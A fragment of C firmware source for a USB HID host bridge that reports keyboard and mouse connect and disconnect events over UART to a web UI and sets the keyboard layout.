void c6_uart_feed_mouse_report(const uint8_t *buf, size_t len) {
    (void)buf; (void)len;
    if (s_mouse_interface_present && !s_mouse_seen_connected) {
        s_mouse_seen_connected = true;
        tx_line("EVT", "MOUSE_CONNECT");
    }
}

void c6_uart_set_layout(const char *name) {
    if (!name) return;
    if      (!strcmp(name, "DE")) kb_layout_set(KL_DE);
    else if (!strcmp(name, "UK")) kb_layout_set(KL_UK);
    else                          kb_layout_set(KL_US);
}

// Public escape hatch so hid_host_task.c can push status events (like
// ENUM_RETRY N/8) to the C6 web UI without pulling in c6_uart's internals.
void c6_uart_send_evt(const char *body) { if (body) tx_line("EVT", body); }

bool c6_uart_link_ready(void) { return s_ready; }

void c6_uart_kbd_connect(void)     { s_kbd_interface_present = true; s_kbd_iface_up_ms = now_ms(); memset(s_prev_keys, 0, sizeof(s_prev_keys)); s_prev_mod = 0; combo_reset(); memset(s_pressed, 0, sizeof(s_pressed)); }
void c6_uart_kbd_disconnect(void) {
    // Only emit DISCONNECT if we ever emitted CONNECT — otherwise a composite
    // mouse's phantom kbd interface unplug would flash the pill red for no
    // reason.
    bool announce = s_kbd_seen_connected;
    s_kbd_interface_present = false;
    s_kbd_seen_connected    = false;
    if (announce) tx_line("EVT", "KBD_DISCONNECT");
    memset(s_prev_keys, 0, sizeof(s_prev_keys));
    s_prev_mod = 0; combo_reset();
    memset(s_pressed, 0, sizeof(s_pressed));
}
void c6_uart_mouse_connect(void)   { s_mouse_interface_present = true; /* wait for first report */ }
void c6_uart_mouse_disconnect(void){ s_mouse_interface_present = false; if (s_mouse_seen_connected) { s_mouse_seen_connected = false; tx_line("EVT", "MOUSE_DISCONNECT"); } }
